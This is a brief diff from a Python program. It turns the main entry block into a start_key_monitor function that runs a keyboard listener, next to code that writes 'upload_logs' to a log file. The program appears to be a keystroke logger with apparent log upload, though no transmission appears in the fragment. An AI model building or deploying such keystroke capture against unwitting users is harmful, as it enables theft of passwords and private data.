@@ -104,6 +104,7 @@ def reconstruct_logs():
         with open(LOG_FILE, 'w', encoding='utf-8') as file:
             file.write("\n".join(upload_logs))
 
-if __name__ == "__main__":
+# 메인에서 실행
+def start_key_monitor():
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
